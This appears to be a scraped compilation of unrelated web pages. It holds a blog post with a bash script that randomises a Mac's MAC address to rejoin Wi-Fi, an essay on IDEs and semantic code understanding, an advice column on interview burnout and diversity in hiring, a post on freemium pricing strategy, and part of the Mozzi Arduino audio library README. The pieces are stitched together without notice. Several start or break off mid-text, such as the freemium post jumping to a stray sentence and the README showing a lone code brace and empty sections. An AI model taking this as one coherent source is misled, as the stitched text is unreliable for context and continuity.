<p>First off, not all randomly-generated mac addresses are valid, even though they were passing an online mac address validator I was testing against. <a href="https://askubuntu.com/a/536221">AskUbuntu</a> nicely shared what was going on.</p>

<p>I didn’t want to deal with manually building a valid MAC address; I just noticed that about 2 out of 3 attempts to change my mac address, using the above script, the MAC address didn’t change.</p>

<p>So, my next version of this script pulls the <code>generate mac address</code> and <code>set current mac address to generated mac address</code> steps into a function, and keeps calling the function until the mac address has changed.</p>

<p>Why be elegant and precise when you can brute force a crappy solution?</p>

<p>Here’s my finished “solution”:</p>

<div><div><pre><code><span>#!/bin/bash</span>
<span># skipping some lines</span>
<span>read</span> <span>-p</span> <span>'Step 4: Which device lined up would you like to change? (hit return for en0) '</span> ether_adapter

<span>if</span> <span>[</span> <span>-z</span> <span>$ether_adapter</span> <span>]</span>
<span>then
  </span><span>ether_adapter</span><span>=</span><span>"en0"</span>
<span>fi

</span><span>export </span><span>ether_adapter</span><span>=</span><span>$ether_adapter</span>

generate_and_set_new_mac_address<span>()</span> <span>{</span>
  <span>mac</span><span>=</span><span>$(</span> openssl rand <span>-hex</span> 6 | <span>sed</span> <span>"s/</span><span>\(</span><span>..</span><span>\)</span><span>/</span><span>\1</span><span>:/g; s/./0/2; s/.</span><span>$/</span><span>/"</span><span>)</span>
  <span>export </span><span>mac</span><span>=</span><span>$mac</span>
  <span>echo</span> <span>"OK, we will change the mac address associated with: </span><span>$ether_adapter</span><span>"</span>

  <span>old_mac</span><span>=</span><span>$(</span> ifconfig <span>$ether_adapter</span> | <span>grep </span>ether <span>)</span>

  <span>echo</span> <span>"The old value was: </span><span>$old_mac</span><span>"</span>
  <span>sudo </span>ifconfig <span>$ether_adapter</span> ether <span>$mac</span>

  <span>new_mac</span><span>=</span><span>$(</span> ifconfig <span>$ether_adapter</span> | <span>grep </span>ether <span>)</span>
  <span>echo</span> <span>"The new value is: </span><span>$new_mac</span><span>"</span>
<span>}</span>
<span>echo</span> <span>$new_mac</span>
<span>echo</span> <span>$old_mac</span>

<span>while</span> <span>[</span> <span>"</span><span>$new_mac</span><span>"</span> <span>==</span> <span>"</span><span>$old_mac</span><span>"</span> <span>]</span>
<span>do
  </span><span>echo</span> <span>"not the same"</span>
  generate_and_set_new_mac_address
<span>done

</span><span>echo</span> <span>"go ahead and re-connect to the wifi. You should be able to join the network."</span>
</code></pre></div></div>

<p>and this seems to work pretty well:</p>

<p><img src="https://josh.works/images/2019-12-17-bash_script_success.jpg" alt="success"></p>

<p>I hope that in the near future, I’ll look at this bash script and have many ways to improve it. For now, it’ll do the trick.</p>

          Feb 9, 2021 update <a href="#feb-9-2021-update">#</a>
        
        
      </h3>
    

<p>Following <a href="https://twitter.com/serent/status/1359208380435361792">this tweet</a> by <code>@serent</code>, I updated the script a little. To generate a valid MAC address:</p>

<div><div><pre><code><span>@@ -160,7 +162,7 @@</span> fi
 export ether_adapter=$ether_adapter

 generate_and_set_new_mac_address() {
<span>-  mac=$( openssl rand -hex 6 | sed "s/\(..\)/\1:/g; s/.$//" )
</span><span>+  mac=$( openssl rand -hex 6 | sed "s/\(..\)/\1:/g; s/./0/2; s/.$//")
</span>   export mac=$mac
   echo "OK, we will change the mac address associated with: $ether_adapter"
</code></pre></div></div>

<p>There’s other pain points in the script. I’ll fix them at some point.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <article>
  
  <p>Nov 11, 2020</p>
  <p>Some time ago I wrote a reddit comment explaining the benefits of IDEs.
Folks refer to it from time to time, so I decided to edit it into an article form.
Enjoy!</p>
<p>I think I have a rather balanced perspective on IDEs.
I used to be a heavy Emacs user (<a href="https://github.com/matklad/.emacs.d/tree/475de5db99f8729c57fed7e6fde4cd06f5ccb62f">old config</a>, <a href="https://github.com/matklad/config/blob/d555642a5a9e4e8b0ca0c77f188ffd976f06327c/home/.emacs.d/init.el">current config</a>).
I worked at JetBrains on <a href="https://github.com/intellij-rust/intellij-rust">IntelliJ Rust</a> for several years.
I used evil mode and vim for a bit, and tried tmux and kakoune.
Nowadays, I primarily use VS Code to develop <a href="https://github.com/rust-analyzer/rust-analyzer/">rust-analyzer</a>: LSP-based editor-independent IDE backend for Rust.</p>
<p>I will be focusing on IntelliJ family of IDEs, as I believe these are the most advanced IDEs today.</p>
<p>The main distinguishing feature of IntelliJ is semantic understanding of code.
The core of IntelliJ is a compiler which parses, type checks and otherwise understands your code.
<a href="https://martinfowler.com/bliki/PostIntelliJ.html">PostIntelliJ</a> is the canonical post about this.
That article also refutes the claim that “Smalltalk IDE is the best we’ve ever had”.</p>
<p>Note that “semantic understanding” is mostly unrelated to the traditional interpretation of “IDE” as <em>Integrated</em> Development Environment.
I personally don’t feel that the “Integrated” bit is all that important.
I commit&amp;push from the command line using Julia scripts, rebase in magit, and do code reviews in a browser.
If anything, there’s an ample room for improvement for the integration bits.
For me, <strong>I</strong> in “<strong>I</strong>DE” stands for “intelligent”, smart.</p>
<p>Keep in mind this terminology difference.
I feel it is a common source of misunderstanding.
“Unix and command line can do anything an IDE can do” is correct about integrated bits, but is wrong about semantical bits.</p>
<p>Traditional editors like Vim or Emacs understand programming languages very approximately, mostly via regular expressions.
For me, this feels very wrong.
It’s <a href="https://stackoverflow.com/a/1732454">common knowledge</a> that HTML shall not be parsed with regex.
Yet this is exactly what happens every time one does <code>vim index.html</code> with syntax highlighting on.
I sincerely think that almost every syntax highlighter out there is wrong and we, as an industry, should do better.
I also understand that this is a tall order, but I do my best to change the status quo here :-)</p>
<p>These are mostly theoretical concerns though.
The question is, does semantic understanding help in practice?
I am pretty sure that it is non-essential, especially for smaller code bases.
My <a href="https://github.com/matklad/rustraytracer">first non-trivial Rust program</a> was written in Emacs, and it was fine.
Most of rust-analyzer was written using pretty spartan IDE support.
There are a lot of insanely-productive folks who are like “sometimes I type vim, sometimes I type vi, they are sufficiently similar”.
Regex-based syntax highlighting and regex based fuzzy symbol search (<a href="https://github.com/universal-ctags/ctags">ctags</a>) get you a really long way.</p>
<p>However, I do believe that features unlocked by deep understanding of the language help.
The funniest example here is extend/shrink selection.
This features allows you to extend current selection to the next encompassing syntactic construct.
It’s the simplest feature a PostIntelliJ IDE can have, it only needs the parser.
But it is sooo helpful when writing code, it just completely blows vim’s text objects out of the water, especially when combined with multiple cursors.
In a sense, this is structural editing which works for text.</p>
<div>
<p><img src="https://user-images.githubusercontent.com/1711539/98809232-80e3db00-241d-11eb-883a-5aece9a1dbfc.gif" alt="98809232 80e3db00 241d 11eb 883a 5aece9a1dbfc">
</p>
</div>
<p>If you add further knowledge of the language into a mix, you’ll get the “assists” system: micro-refactoring which available in a particular context.
For example, is the cursor is on a comma in a list of function arguments, you can <span><kbd>alt</kbd>+<kbd>enter</kbd></span> &gt; “swap arguments”, and the order of arguments will be changed in the declaration and on various call-sites as well.
(See <a href="https://rust-analyzer.github.io/blog/2020/09/28/how-to-make-a-light-bulb.html">this post</a> to learn how assists are implemented).</p>
<p>These small dwim things add up to a really nice editing experience, where you mostly express the intention, and the IDE deals with boring syntactical aspects of code editing:</p>
<div>
<p><img src="https://user-images.githubusercontent.com/1711539/98812121-37e25580-2422-11eb-8541-2c5a32926845.gif" alt="98812121 37e25580 2422 11eb 8541 2c5a32926845">
</p>
</div>
<p>For larger projects, complex refactors are a huge time-saver.
Doing project-wide renames and signature changes automatically and without thinking reduces the cost of keeping the code clean.</p>
<p>Another transformative experience is navigation.
In IntelliJ, you generally don’t “open a file”.
Instead you think directly in terms of functions, types and modules, and navigate to those using file structure, goto symbol, to do definition/implementation/type, etc:</p>

<p>When I used Emacs, I really admired its buffer management facilities, because they made opening a file I want a breeze.
When I later switched to IntelliJ, I stopped thinking in terms of a set of opened files altogether.
I disabled editor tabs and started using editor splits less often — you don’t need bookmarks if you can just find things.</p>
<p>For me, there’s one aspect of traditional editors which is typically not matched in IDEs out of the box — basic cursor motion.
Using arrow keys for that is slow and flow-breaking, because one needs to move the hand from the home row.
Even Emacs' horrific <kbd>C-p</kbd>, <kbd>C-n</kbd> are a big improvement, and vim’s <kbd>hjkl</kbd> go even further.
One fix here is to configure each tool to use your favorite shortcuts, but this is a whack-a-mole game.
What I do is remapping <kbd>CapsLock</kbd> to act as an extra modifier, such that <kbd>ijkl</kbd> <strong>are</strong> arrow keys.
(There are also keyboards with <a href="https://ultimatehackingkeyboard.com/">hardware</a> <a href="https://ergodox-ez.com/">support</a> for this).
This works in all applications the same way.
Easy motion / ace jump functionality for jumping to any visible character is also handy, and usually is available <a href="https://plugins.jetbrains.com/plugin/9803-acejump-lite">via</a> <a href="https://marketplace.visualstudio.com/items?itemName=lucax88x.codeacejumper">a plugin</a>.</p>
<p>Recent advancements with LSP protocol promise to give one the best of both worlds, where semantic-aware backend and light-weight editor frontend are different processes, which can be mixed and matched.
This is nice in theory, but not as nice in practice as IntelliJ yet, mostly because IntelliJ is way more polished.</p>
<p>To give a simple example, in IntelliJ for “go to symbol by fuzzy name” functionality, I can filter the search scope by:</p>
<div>
<ul>
<li>
<p>is this my code/code from a dependency?</p>
</li>
<li>
<p>is this test/production code?</p>
</li>
<li>
<p>is a symbol a type-like thing, or a method-like thing?</p>
</li>
<li>
<p>path to the module where the symbol is defined.</p>
</li>
</ul>
</div>
<p>VS Code and LSP simply do not have capabilities for such filters yet, they have to be bolted on using hacks.
Support for LSP in other editors is even more hit-and-miss.</p>
<p>LSP did achieve a significant breakthrough — it made people care about implementing IDE backends.
Experience shows that re-engineering an existing compiler to power an IDE is often impossible, or isomorphic to a rewrite.
How a compiler talks to an editor is the smaller problem.
The hard one is building a compiler that can do IDE stuff in the first place.
Check out <a href="https://rust-analyzer.github.io/blog/2020/07/20/three-architectures-for-responsive-ide.html">this post</a> for some of the technical details.
Starting with this use-case in mind saves a lot of effort down the road.</p>
<p>This I think is a big deal.
I hypothesize that the reason why IDEs do not completely dominate tooling landscape is the lack of good IDE backends.</p>
<p>If we look at the set of languages fairly popular recently, a significant fraction of them is dynamically typed: PHP, JavaScript, Python, Ruby.
The helpfulness of an IDE for dynamically typed languages is severely limited: while approximations and heuristics can get you a long way, you still need humans in the loop to verify IDE’s guesses.</p>
<p>There’s C++, but its templates are effectively dynamically typed, with exactly the same issues (and a very complex base language to boot).
Curiously, C looks like a language for which implementing a near-perfect IDE is pretty feasible.
I don’t know why it didn’t happen before CLion.</p>
<p>This leaves C# and Java.
Indeed, these languages are dominated by IDEs.
There’s a saying that you can’t write Java without an IDE.
I think it gets the causation direction backwards: Java is one of the few languages for which it is possible to implement a great IDE without great pain.
Supporting evidence here is Go.
According to <a href="https://blog.golang.org/survey2019-results#TOC_5.">survey results</a>, text editors are stably declining in popularity in favor of IDEs.</p>
<p>I think this is because Go actually has good IDEs.
This is possible because the language is sufficiently statically typed for an IDE to be a marked improvement.
Additionally, the language is very simple, so the amount of work you need to put in to make a decent IDE is much lower than for other languages.
If you have something like JavaScript…​
Well, you first need to build an alternative language for which you can actually implement an IDE (<a href="https://www.typescriptlang.org/">TypeScript</a>) and only then you can build the IDE itself (<a href="https://github.com/microsoft/vscode">VS Code</a>).</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><blockquote>
<p>Dear Marie,</p>
<p>I am one of a handful of women engineers at my company and I have been interviewing 1-2 candidates per week for the past several months. Since I started interviewing, we have only hired white or Asian men.</p>
<p>Bringing in underrepresented identities to my workplace is important to me, and leadership at my company constantly says they value ‘Diversity and Inclusion’. I’ve offered ideas on how to attract a wider group of candidates, but I don’t feel like I am heard or taken seriously. I’m exhausted being part of the interview team with the results we have. At this point, I only want to interview underrepresented candidates, but that seems inappropriate to ask for.</p>
<p>Am I complicit in a racist, sexist system? How can I push for change and preserve my energy?</p>
</blockquote>
<!-- question -->

<p>Hey there,</p>
<p>Interviewing one or two candidates per week for months sounds absolutely exhausting. It’s no wonder that you’re tired and burnt out—especially if it seems like your company isn’t actually hiring anyone outside their established pattern, despite their avowed dedication to diversity and inclusion.</p>
<p><strong>I have found conducting interviews to be difficult and energy-consuming work, particularly if you are invested in treating candidates equitably and with empathy.</strong> It’s not just that the hour-long calendar block in the middle of the day, it’s also:</p>
<ul>
<li>preparing for the interview ahead of time, making sure you have all the resources you need and your environment is set up.</li>
<li>being deeply focused during the interview, paying attention to the smallest of interactions to discern signals (of varying reliability) about a person’s areas of technical expertise and approach to work and collaboration.</li>
<li>responding to candidates on the fly, figuring out the right balance of giving them a hint when they’re stuck and seeing how they solve a problem themselves, and ensuring they have an excellent experience with your company.</li>
<li>writing up feedback afterwards and deliberating your evaluation and whether you’ve let unconscious bias influence you and if your feedback is well-calibrated with the rest of the hiring group so that you’re not consistently scoring everyone higher or lower than the average.</li>
<li>participating in decisions and conversations around interviewing as a whole, and how to make it more equitable and inclusive.</li>
</ul>
<p>It sounds like you aren’t hiring specifically for roles on your immediate team, but rather part of a group of interviewers who support hiring across the whole company. This structure makes sense for larger organizations who have a steady stream of open roles. If everyone helps out a little bit all the time, then no one team’s productivity is completely sunk when they need to hire.</p>
<p>The downside, of course, is that the hiring never really stops. <strong>You don’t get to celebrate by welcoming your new teammate; you just keep interviewing. And interviewing. And interviewing.</strong></p>
<p>At one company, I completed over 100 technical interviews in about two years. I had prided myself on being a very good interviewer, in part because of all the practice. By the end, I was completely miserable and I hated everything about it. I couldn’t convince myself to care about candidates anymore and I was having trouble focusing and giving them my full attention. So, I stopped interviewing. And it was <em>such</em> a relief. It wasn’t even necessarily the time back that I cared about; it was <strong>letting go of the immense responsibility of contributing to hiring decisions, but with so little authority to change anything.</strong></p>
<p>Consider a few of these options, and what each one feels like:</p>
<ul>
<li>What if you reduced your availability to one interview a week?</li>
<li>What if you reduced your availability to two interviews a month?</li>
<li>What if you stopped interviewing for a month?</li>
<li>What if you stopped interviewing for a quarter?</li>
</ul>
<p><strong>Did you feel a sense of relief or joy when you imagined those? Which ones feels the most like what you need right now?</strong></p>
<p>You say that you’ve offered ideas about how to improve your hiring practices and that you <em>“don’t feel like I am heard or taken seriously.”</em> I am guessing that you are not a manager, or any other person who makes the final call on hiring decisions. If you were, my advice would be very different<sup id="fnref-1"><a href="#fn-1">1</a></sup>.</p>
<p>But if I’m right, your main job responsibility is probably to write, release, and maintain software—<em>not</em> to build a team or manage their collective effectiveness. A manager <em>must</em> hire at some point if they want to ensure their team has the right balance of expertise and experience. You probably help out managers at your company by giving them quality feedback about the people they are considering hiring; but it’s unlikely that your annual evaluation centers on your participation in the hiring process or the hiring outcomes at your company.</p>
<p>So… take a break. Don’t stop entirely or forever; you are doing the important work of advocating for inclusion and equity, I would hate for you to give that up entirely. But it sounds like what you’re doing now isn’t working the way you had hoped, and you’re too tired to imagine a bigger and bolder approach right now.</p>
<p><strong>I have quipped that my main career goal is to do such outstanding work that I can be a complete and total pain in the ass about the things that truly matter, like accessibility and inclusion and equity.</strong> That doesn’t mean that I’m waiting until I’ve “arrived” to advocate for what I know is right and to put my privilege to use. It means that I don’t waste my battles on inconsequential things and I try to make myself valuable enough that I’m harder to push out when I do dig in my heels.</p>
<p>But in order to spend social capital, you have to build it up first—and for you, that might mean giving up interviewing for a bit, focusing on your main job responsibility and building relationships with your coworkers, then coming back with a fresh perspective, renewed energy, and a group of like-minded peers with a common goal of improving the hiring process.</p>
<p>Assuming that you don’t have the authority to make a hire/no-hire decision or to revamp your recruiting process, you’re a bit limited in what you can do on your own. <strong>But there is strength in numbers, and it’s harder to ignore a group.</strong> See if you can find or organize a few people who <em>also</em> care about diversity and inclusion in recruiting and hiring. It doesn’t have to be anything formal<sup id="fnref-2"><a href="#fn-2">2</a></sup>, it can just be three people who all +1 each other’s ideas and bring up the same important questions again and again.</p>
<p><strong>You also asked: <em>“Am I complicit in a racist, sexist system?”</em> I’m not sure that I can answer that one for you.</strong> You know your situation much better than I do; if that’s a concern that keeps coming up for you, sit with it. It may be that there’s something you need to do that you haven’t yet.</p>
<p>I think you would definitely be complicit if you stopped raising concerns about inclusion entirely; if you ignored or minimized the concerns raised by other marginalized people because it makes you feel uncomfortable about your own choices or privilege; or if you had the authority to make a change for the better and you didn’t use it.</p>
<p><strong>If you do come to the conclusion that you have not been living up to your values and have instead prioritized your comfort or advancement over the equity of all—welcome to the club.</strong> We mess up a lot, and we learn with empathy and gratitude for the people who corrected us. That’s another benefit to finding some peers who can advocate alongside you—you’ll each have areas of insight the others won’t and you can teach each other.</p>
<p>I hope that you’re able to take a break from interviewing. I hope that when you’re ready to resume, it’s because you’re genuinely excited to have some influence over hiring at your company and you feel equipped to push for practices that you know are worthwhile<sup id="fnref-3"><a href="#fn-3">3</a></sup>. I hope you find support from other engineers who care about inclusion. I hope your company figures out a way to stop using whatever metrics they love that so consistently undervalue Black and Indigenous people, Hispanic/Latinx people, women and people with other minoritized genders, disabled people, LGTBQ+ people, and those who span more than one of those communities.</p>
<p>In short: I hope you get good rest, and that rest fuels you for another round. There is much work to be done. Let’s do it together. 💖</p>
<p>With so much warmth,<br>
Marie</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-179"><div><p>I took a deep dive on freemium pricing and decided to document it in this post. Why freemium? I think it's how the little guys can win against market leaders.</p><p>Basically, it's how you kill a unicorn.</p><p>Notion, Figma, Canva, Mailchimp, and Segment. What do all of these platforms have in common, besides being category leaders? Each one has unseated the previous category leaders with less money and smaller teams. Each has also opted for a product led growth strategy that is fueled by product virality and an innovative pricing strategy.</p><p>But let's back up. How did we get here?</p><p>The year is 2012 and the preeminent name in design isn't Sketch or Figma - it's Adobe. 2012 era Adobe is a much different beast to where we are now. There was no real SaaS model and licenses were hundreds of dollars each, locked to a machine, and didn't get upgrades. Still, Adobe is unequivocally the category leader. But in just a few years, that would all change due to an enterprising young entrepreneur and her new business model.</p><p>Canva launched in 2012 and spread like wildfire. In 3 years, the company was able to accumulate accumulated 10 million users, with almost 1 million coming in the first year alone. By the next year, they had 17 thousand videos about their product.</p><p>This kind of fervent user adoption is the stuff of legend. I started hearing about Canva around that time. My then-girlfriend (now wife) had put together a project and it looked much better than anything I could knock out in Photoshop or Illustrator. She mentioned it was not only really easy to use, but it was free! At the time I think I was still bouncing from Adobe license to Adobe license, each of which was half a month's rent, so I was blown away.</p><p>Then I started seeing it everywhere. It was being used for school projects, large advertising campaigns, and was the first recommendation in online groups whenever someone needed a design tool.</p><p>That space used to be occupied by Adobe, but in a matter of a few years, they were being overtaken in the B2C and even a bit in the B2B space by a brand new company with a limited amount of funding.</p><figure><img width="1024" height="570" src="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled1-1024x570.png" alt="" srcset="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled1-1024x570.png 1024w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled1-300x167.png 300w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled1-768x427.png 768w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled1.png 1215w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled1-1024x570.png" data-srcset="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled1-1024x570.png 1024w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled1-300x167.png 300w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled1-768x427.png 768w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled1.png 1215w"></figure><figure><img width="1024" height="572" src="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled2-1024x572.png" alt="" srcset="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled2-1024x572.png 1024w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled2-300x167.png 300w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled2-768x429.png 768w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled2.png 1227w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled2-1024x572.png" data-srcset="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled2-1024x572.png 1024w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled2-300x167.png 300w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled2-768x429.png 768w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled2.png 1227w"></figure><p>Meanwhile, another company, Sketch, was eating away at their market share by offering design-focused tools for modern internet companies. Adobe had Photoshop and Illustrator, neither of which was purpose-built for the internet and both of which were expensive af. Adobe XD wasn't quite production-ready at that point, so Sketch was able to make inroads by offering a lower-priced license for its software.</p><p>Out of left-field comes the Canva of professional design tools: Figma.</p><figure><img width="1024" height="565" src="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled3-1024x565.png" alt="" srcset="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled3-1024x565.png 1024w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled3-300x165.png 300w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled3-768x423.png 768w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled3.png 1255w" sizes="(max-width: 1024px) 100vw, 1024px" data-old-src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled3-1024x565.png" data-srcset="https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled3-1024x565.png 1024w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled3-300x165.png 300w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled3-768x423.png 768w, https://www.chrisfrantz.com/wp-content/uploads/2021/01/Untitled3.png 1255w"></figure><p>Figma quickly overtakes Sketch by offering a few unique features and an unbeatable pricing model. Freemium, with a twist.</p><p>Figma, like Canva before it, quickly discovered the power that a free product with shareable outputs offers. Users create content with the tool, share the content and then inevitably get asked how it was made. Of course, the user is both happy to share and give a positive recommendation since the output content is being appreciated, and the platform gains another user.</p><p>A couple points to understand about the shiny world of marketing:</p><ul><li>Recommendations from trusted people always lead to higher conversion rates. It's easy to recommend free things since the only exchange is time.</li><li>Backlinks are everything, still. Google hasn't cracked how to build page authority without backlinks and having them everywhere, attached with positive recommendations and high user dwell time once a user clicks a link, is seen as a positive signal.</li><li>Creating content in the app means content can be shared outside the app. That's a simple growth mechanism that can be leveraged mightily once a certain user volume has been hit.</li><li>Finally, email is the best marketing channel still. Freemium platforms exchange email addresses for access and make lead generation a snap.</li></ul><p>So Adobe now is taking fire from all sides and they eventually pivot to a cloud-based subscription model while also focusing all their efforts upmarket on the professional landscape, effectively ceding their B2C audience to Canva.</p><p><em>Quick note: There are many other factors that go into making a platform successful, from the founder to tech to the support. Pricing is just one of the pieces.</em></p><h2><strong>How Freemium really works</strong></h2><p>The common misconception with freemium is that it’s an easy way to not generate any revenue. How many stories have you heard about independent projects that have been worked on for years, only to launch with only a few dollars in revenue, followed by months of slogging before eventually shutting down. That’s very likely&nbsp;<em>not</em>&nbsp;a pricing problem, but a positioning problem. You need to position your product in front of the right audiences and the price becomes a natural fit for your expansion strategy.</p><p>In reality, there are a number of different ingredients in the recipe you need to nail before you can actually execute a freemium strategy effectively. You don’t need a team of hundreds of people, but it does help to lay out the strategy ahead of time.</p><p>Let's break out the different factors involved in setting up a freemium plan.</p><ul><li>Pricing that scales with usage</li><li>Shareable content</li><li>In-app upsells</li><li>Massive market opportunity</li><li>Pricing innovation on the primary value</li></ul><p>First, if you are missing even one of these, it might not be the pricing strategy for you. Each part is key in building out a converting freemium funnel.</p><p><strong>Pricing that scales with usage</strong></p><p>If a user wants to dip a toe in and play around with your platform, they can do that at zero cost (outside of an email address). That’s the basic premise of a freemium plan, but what happens when a user is converted and wants to expand their usage?</p><p>Your pricing should accommodate that natural urge and your product should gracefully allow them to expand their usage with as few barriers as possible.</p><p><strong>In-app upsells aka feature gating</strong></p><p>You need to rope off some of your app so there’s a reason to pay! However, you should charge based on either&nbsp;<strong>secondary user value or</strong>&nbsp;expanding the primary user value, but ideally both.</p><p>Let me explain. Google Analytics made analytics free and accessible to everyone. They charge based on primary user value, but only if you want to expand to a much higher tier of usage. For 99% of people, it will always be free.</p><p>That’s great, but really they only offer expanding their primary user value (analytics) as an upsell. Profitwell, one of my favorite companies utilizing this technique, charges entirely on secondary user value. They offer Profitwell Retain, a dunning service, on top of their analytics.

Our goal with shareable content is to increase the k factor of a user, effectively turning a free user into a marketing machine.

    <p>Currently your Arduino can only beep like a microwave oven. Mozzi brings
your Arduino to life by allowing it to produce much more complex and interesting growls, sweeps and chorusing atmospherics. These sounds can be quickly and easily constructed from familiar synthesis units like oscillators, delays, filters and envelopes.</p>

<p>You can use Mozzi to generate algorithmic music for an installation or
performance, or make interactive sonifications of sensors, on a small, modular and super cheap Arduino, without the need for additional shields, message passing or external synths.</p>

<p>Here are some sounds of the example sketches which come with Mozzi:</p>

<h2 id="installation">Installation</h2>
<p>Download the most recent Mozzi from the link at the top of this page.
Then, follow the instructions from the <a href="https://arduino.cc/en/Guide/Libraries">Arduino libraries guide</a>.</p>

<h2 id="quick-start">Quick Start</h2>
<p>To hear Mozzi, wire a 3.5mm audio jack with the centre to the audio out pin for your Arduino as shown in the table below, and the shield to GND on the Arduino.
Plug into your computer and listen with a sound program like <a href="https://audacity.sourceforge.net/">Audacity</a>.
Try some examples from the <strong>File &gt; Examples &gt; Mozzi</strong> menu.</p>

<span>}</span></code></pre></figure>

<p>There’s a detailed example explaining the different parts <a href="https://sensorium.github.io/Mozzi/learn/a-simple-sketch/">here</a>.</p>

<h2 id="documentation">Documentation</h2>

<p>There’s documentation in the extras/doc folder in the Mozzi download and <a href="https://sensorium.github.com/Mozzi/doc/html/index.html">online</a>.
There is practical help on the <a href="https://sensorium.github.io/Mozzi/learn/">learn</a> page on the Mozzi site.

<h2 id="weird-things">Weird things</h2>

<h3 id="avr">AVR</h3>

<ul>
  <li>
    <p>While Mozzi is running, calling <code>delay()</code>, <code>delayMicroseconds()</code>, or other functions which wait or cycle through loops can cause audio glitches.
Mozzi provides <code>EventDelay()</code> for scheduling instead of <code>delay()</code>.</p>
  </li>
  <li>
    <p><code>analogRead()</code> is replaced by <code>mozziAnalogRead()</code>, which works in the background instead of blocking the processor.</p>
  </li>
  <li>
    <p>Mozzi interferes with <code>analogWrite()</code>.  In <code>STANDARD</code> and <code>STANDARD_PLUS</code> audio modes, Mozzi takes over Timer1 (pins 9 and 10), but you can use the Timer2 pins, 3 and 11 (your board may differ).  In <code>HIFI</code> mode, Mozzi uses Timer1 (or Timer4 on some boards), and Timer2, so pins 3 and 11 are also out.  If you need <code>analogWrite()</code>, you can do PWM output on any digital pins using the technique in <em>Mozzi&gt;examples&gt;11.Communication&gt;Sinewave_PWM_pins_HIFI</em>.</p>
  </li>
  <li>
    <p>The timers can be made available with <code>stopMozzi()</code>, which stops audio interrupts, until you call <code>startMozzi()</code>.</p>
  </li>
</ul>

<h2 id="contributions--included-dependencies">Contributions / Included Dependencies</h2>
<p>Modified versions of the following libraries are included in the Mozzi download:</p>

<h2 id="hardware-specific-notes">Hardware specific notes</h2>

<h3 id="stm32duino">STM32(duino)</h3>
<p>port by Thomas Friedrichsmeier</p>

<p>Compiles for and runs on a STM32F103C8T6 blue pill board, with a bunch of caveats (see below), i.e. on a board <em>without</em> a
real DAC. Should probably run on any other board supported by <a href="https://github.com/rogerclarkmelbourne/Arduino_STM32">STM32duino</a>.</p>

<ul>
  <li>You will need a very recent (12/2017) checkout of the Arduino_STM32 repository, otherwise compilation will fail.</li>
  <li>Audio output is to pin PB8, by default (HIFI-mode: PB8 and PB9)</li>
  <li>If you want to use MIDI, be sure to replace “MIDI_CREATE_DEFAULT_INSTANCE()” with “MIDI_CREATE_INSTANCE(HardwareSerial, Serial1, MIDI)” (or Serial2)</li>
  <li>Timers 4 (PWM output), and 2 (audio rate) are used by default.</li>
  <li>The STM32-specific options (pins, timers) can be configured in AudioConfigSTM32.h</li>
  <li>Default audio resolution is currently set to 10 bits, which yields 70khZ PWM frequency on a 72MHz CPU. HIFI mode is 2*7bits at up to 560Khz (but limited to 5 times audio rate)</li>
  <li>HIFI_MODE did not get much testing</li>
  <li>STEREO_HACK not yet implemented (although that should not be too hard to do)</li>
  <li>AUDIO_INPUT is completely untested (but implemented in theory)</li>
  <li>Note that AUDIO_INPUT and mozziAnalogRead() return values in the STM32’s full ADC resolution of 0-4095 rather than AVR’s 0-1023.</li>
  <li>twi_nonblock is not ported</li>
</ul>

<h3 id="teensy-3031323435lc">Teensy 3.0/3.1/3.2/3.4/3.5/LC</h3>

<p>Extra libraries required for use withTeensy 3.*:<br>
These are included in the standard Teensyduino install unless you explicitly disable them</p>
<ul>
  <li><a href="https://github.com/loglow/IntervalTimer">Timer library</a> for Teensy 3.* by Daniel Gilbert</li>
  <li><a href="https://github.com/pedvide/ADC">ADC library</a> by Pedro Villanueva</li>
</ul>

<p>Some of the differences for Teensy 3.* which will affect users include:</p>

<ul>
  <li>On Teensy 3.0/3.1/3.2 audio output is on pin A14/DAC, in STANDARD or STANDARD_PLUS audio modes. These modes are identical on Teensy 3.0/3.1/3.2, as the output is via DAC rather than PWM.</li>
